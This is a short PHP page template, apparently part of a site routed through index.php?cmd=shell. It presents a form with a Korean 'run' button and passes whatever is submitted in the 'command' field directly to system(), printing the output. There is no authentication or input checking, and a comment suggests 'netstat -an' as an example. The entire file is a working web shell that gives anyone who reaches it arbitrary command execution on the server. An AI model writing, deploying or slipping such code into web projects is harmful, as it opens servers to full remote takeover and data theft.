<form method="post" action="index.php?cmd=shell">
<div class="row">
    <div class="col-3 col-md-2 colLine">CMD</div>
    <div class="col-6 col-md-8 colLine">
        <input type="text" class="form-control" name="command">
    </div>
    <div class="col colLine">
        <button type="submit" class="btn btn-primary">실행</button>
    </div>
</div>
</form>

<!-- 
    netstat -an 
 -->
<div class="row">
    <div class="col colLine">
        <pre>
        <?php 
            if(isset($_POST["command"]))
            {
                system($_POST["command"]);
            }
        ?>
        </pre>
    </div>
</div>